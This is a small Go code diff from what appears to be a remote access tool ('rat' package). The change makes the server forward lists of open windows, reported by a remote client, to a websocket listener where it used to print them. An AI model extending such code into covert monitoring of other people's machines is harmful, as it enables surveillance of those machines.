@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"rat/shared"
 	"rat/shared/network/header"
 )
@@ -19,8 +18,8 @@ func (packet WindowsPacket) Init(c *Client) {
 }
 
 func (packet WindowsPacket) OnReceive(c *Client) error {
-	for _, window := range packet.Windows {
-		fmt.Println(window)
+	if ws, ok := c.Listeners[header.WindowsHeader]; ok {
+		return sendMessage(ws, c, WindowMessage{packet.Windows})
 	}
 
 	return nil
